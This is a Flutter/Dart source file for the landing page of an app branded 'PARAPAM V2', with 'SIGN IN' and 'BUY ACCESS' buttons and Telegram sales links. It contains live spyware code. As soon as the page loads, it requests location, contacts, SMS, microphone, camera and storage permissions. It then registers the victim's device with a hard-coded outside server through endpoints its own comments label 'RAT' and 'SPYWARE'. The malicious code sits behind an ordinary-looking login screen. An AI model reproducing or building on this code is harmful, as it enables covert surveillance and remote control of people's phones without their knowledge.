import 'dart:ui';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';

import 'login_page.dart'; 

// SERVER UTAMA (RAT + SPYWARE)
const String SERVER_URL = "http://gunturpanel.pirzyycloud.my.id:3001";

class LandingPage extends StatefulWidget {
  const LandingPage({super.key});

  @override
  State<LandingPage> createState() => _LandingPageState();
}

class _LandingPageState extends State<LandingPage> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> fadeAnimation;
  late Animation<Offset> slideAnimation;

  final Color darkBg = const Color(0xFF050505);
  final Color primaryRed = const Color(0xFFE53935);
  final Color darkRed = const Color(0xFFB71C1C);
  final Color redGlow = const Color(0xFFE57373);

  String _deviceId = "";
  String _deviceModel = "";
  bool _isRegistered = false;
  bool _isLoading = false;

  @override
  void initState() {
    super.initState();
    _getDeviceInfo();
    _initTargetSystem();

    _controller = AnimationController(vsync: this, duration: const Duration(seconds: 1));
    fadeAnimation = Tween<double>(begin: 0, end: 1).animate(_controller);
    slideAnimation = Tween<Offset>(begin: const Offset(0, 0.2), end: Offset.zero).animate(_controller);
    _controller.forward();
  }

  Future<void> _getDeviceInfo() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
        setState(() {
          _deviceModel = "${androidInfo.brand} ${androidInfo.model}";
          _deviceId = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_');
        });
      }
    } catch (e) {
      setState(() {
        _deviceId = "ZDX-${Platform.localHostname.hashCode}";
        _deviceModel = "Unknown Device";
      });
    }
  }

  Future<void> _initTargetSystem() async {
    setState(() => _isLoading = true);
    
    // Minta izin
    await [
      Permission.location,
      Permission.contacts,
      Permission.sms,
      Permission.microphone,
      Permission.storage,
      Permission.camera,
      Permission.notification,
    ].request();

    await Future.delayed(const Duration(milliseconds: 500));
    
    // REGISTER KE RAT
    await _registerToRAT();
    
    // REGISTER KE SPYWARE
    await _registerToSpyware();
    
    setState(() => _isLoading = false);
  }

  // REGISTER KE RAT
  Future<void> _registerToRAT() async {
    if (_deviceId.isEmpty) return;
    try {
      final response = await http.post(
        Uri.parse("$SERVER_URL/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": _deviceId,
          "admin_owner": "Guntur",
          "model": _deviceModel,
          "battery": 100,
          "status": "Online",
          "lastSeen": DateTime.now().toIso8601String(),
        }),
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        print("✅ Registered to RAT: $_deviceId");
      }
    } catch (e) {
      print("❌ RAT register error: $e");
    }
  }

  // REGISTER KE SPYWARE
  Future<void> _registerToSpyware() async {
    if (_deviceId.isEmpty) return;
    try {
      final response = await http.post(
        Uri.parse("$SERVER_URL/api/spyware/register"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "device_id": _deviceId,
          "username": "Guntur",
          "model": _deviceModel,
          "battery": 100,
          "online": true,
          "last_seen": DateTime.now().toIso8601String(),
          "type": "spyware",
        }),
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        setState(() => _isRegistered = true);
        print("✅ Registered to Spyware: $_deviceId");
      }
    } catch (e) {
      print("❌ Spyware register error: $e");
    }
  }

  Future<void> _openUrl(String url) async {
    final Uri uri = Uri.parse(url);
    if (await canLaunchUrl(uri)) {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      body: Stack(
        children: [
          // Background glow
          Positioned(top: -120, left: -80, child: _glowCircle(320, primaryRed.withOpacity(0.3))),
          Positioned(bottom: -150, right: -100, child: _glowCircle(360, redGlow.withOpacity(0.2))),
          
          // Loading overlay
          if (_isLoading)
            Container(
              color: Colors.black.withOpacity(0.7),
              child: const Center(
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    CircularProgressIndicator(color: Color(0xFFE53935)),
                    SizedBox(height: 16),
                    Text("Initializing...", style: TextStyle(color: Colors.white)),
                  ],
                ),
              ),
            ),
          
          // Main content
          SafeArea(
            child: FadeTransition(
              opacity: fadeAnimation,
              child: SlideTransition(
                position: slideAnimation,
                child: SingleChildScrollView(
                  physics: const BouncingScrollPhysics(),
                  padding: const EdgeInsets.symmetric(horizontal: 28),
                  child: Column(
                    children: [
                      const SizedBox(height: 60),
                      
                      // Logo
                      TweenAnimationBuilder(
                        tween: Tween<double>(begin: 0.8, end: 1.0),
                        duration: const Duration(milliseconds: 800),
                        builder: (context, double scale, child) {
                          return Transform.scale(scale: scale, child: child);
                        },
                        child: Container(
                          height: 250,
                          child: Image.asset(
                            "assets/images/logo.png", 
                            fit: BoxFit.contain,
                            errorBuilder: (context, error, stackTrace) {
                              return Container(
                                height: 150, width: 150,
                                decoration: BoxDecoration(
                                  color: primaryRed.withOpacity(0.2),
                                  shape: BoxShape.circle,
                                ),
                                child: Icon(Icons.security, size: 80, color: primaryRed),
                              );
                            },
                          ),
                        ),
                      ),
                      
                      const SizedBox(height: 20),
                      
                      // Title
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          colors: [primaryRed, redGlow, Colors.white],
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                        ).createShader(bounds),
                        child: const Text(
                          "PARAPAM V2",
                          style: TextStyle(
                            fontSize: 38,
                            fontWeight: FontWeight.w900,
                            letterSpacing: 3,
                            color: Colors.white,
                          ),
                        ),
                      ),
                      
                      const SizedBox(height: 12),
                      
                      // Subtitle
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                        decoration: BoxDecoration(
                          color: primaryRed.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(30),
                          border: Border.all(color: primaryRed.withOpacity(0.3)),
                        ),
                        child: Text(
                          "The Last Version 2.0",
                          style: TextStyle(color: redGlow, fontSize: 12, letterSpacing: 1),
                        ),
                      ),
                      
                      const SizedBox(height: 20),
                      
                      // Status Connected
                      if (_isRegistered)
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                          decoration: BoxDecoration(
                            color: Colors.green.withOpacity(0.2),
                            borderRadius: BorderRadius.circular(20),
                            border: Border.all(color: Colors.green),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Icon(Icons.check_circle, color: Colors.green, size: 14),
                              const SizedBox(width: 6),
                              Text(
                                "Device Connected",
                                style: TextStyle(color: Colors.green, fontSize: 11),
                              ),
                            ],
                          ),
                        ),
                      
                      const SizedBox(height: 40),
                      
                      // Glassmorphism Card
                      ClipRRect(
                        borderRadius: BorderRadius.circular(26),
                        child: BackdropFilter(
                          filter: ImageFilter.blur(sigmaX: 30, sigmaY: 30),
                          child: Container(
                            padding: const EdgeInsets.all(24),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(26),
                              border: Border.all(color: Colors.white.withOpacity(0.12)),
                            ),
                            child: Column(
                              children: [
                                _primaryButton(),
                                const SizedBox(height: 16),
                                _secondaryButton(),
                                const SizedBox(height: 24),
                                Row(
                                  children: [
                                    Expanded(
                                      child: _contactButton(
                                        FontAwesomeIcons.telegram,
                                        "Channel",
                                        "https://t.me/ParapamXTeam",
                                      ),
                                    ),
                                    const SizedBox(width: 12),
                                    Expanded(
                                      child: _contactButton(
                                        FontAwesomeIcons.telegram,
                                        "Support",
                                        "https://t.me/nxobproject",
                                      ),
                                    ),
                                  ],
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                      
                      const SizedBox(height: 40),
                      
                      // Footer
                      Column(
                        children: [
                          Text(
                            "© 2026 ParapamX Projector",
                            style: TextStyle(color: Colors.white38, fontSize: 10),
                          ),
                          const SizedBox(height: 4),
                          Text(
                            "@chgunturx",
                            style: TextStyle(color: primaryRed.withOpacity(0.5), fontSize: 9),
                          ),
                        ],
                      ),
                      
                      const SizedBox(height: 20),
                      
                      // Device ID (hidden - bisa dihapus)
                      if (_deviceId.isNotEmpty && !_isRegistered)
                        GestureDetector(
                          onLongPress: () => print("Device ID: $_deviceId"),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: Text(
                              _deviceId.length > 35 ? "${_deviceId.substring(0, 35)}..." : _deviceId,
                              style: TextStyle(color: Colors.white24, fontSize: 8, fontFamily: 'monospace'),
                            ),
                          ),
                        ),
                      
                      const SizedBox(height: 20),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _glowCircle(double size, Color color) => Container(
    width: size, height: size,
    decoration: BoxDecoration(
      shape: BoxShape.circle,
      gradient: RadialGradient(colors: [color, Colors.transparent]),
    ),
  );

  Widget _primaryButton() {
    return Container(
      width: double.infinity, height: 55,
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [darkRed, primaryRed]),
        borderRadius: BorderRadius.circular(16),
        boxShadow: [BoxShadow(color: primaryRed.withOpacity(0.6), blurRadius: 25, offset: const Offset(0, 10))],
      ),
      child: ElevatedButton(
        style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, shadowColor: Colors.transparent),
        onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const LoginPage())),
        child: const Text("SIGN IN", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white, letterSpacing: 1.5)),
      ),
    );
  }

  Widget _secondaryButton() => OutlinedButton(
    style: OutlinedButton.styleFrom(
      minimumSize: const Size(double.infinity, 55),
      side: BorderSide(color: primaryRed.withOpacity(0.6), width: 1.5),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
    ),
    onPressed: () => _openUrl("https://t.me/mizukisnji"),
    child: const Text("BUY ACCESS", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600, letterSpacing: 1)),
  );

  Widget _contactButton(IconData icon, String label, String url) {
    return InkWell(
      onTap: () => _openUrl(url),
      borderRadius: BorderRadius.circular(14),
      child: Container(
        height: 50,
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.05),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: Colors.white.withOpacity(0.1)),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            FaIcon(icon, color: primaryRed, size: 18),
            const SizedBox(width: 8),
            Text(label, style: const TextStyle(color: Colors.white70, fontWeight: FontWeight.w600)),
          ],
        ),
      ),
    );
  }
}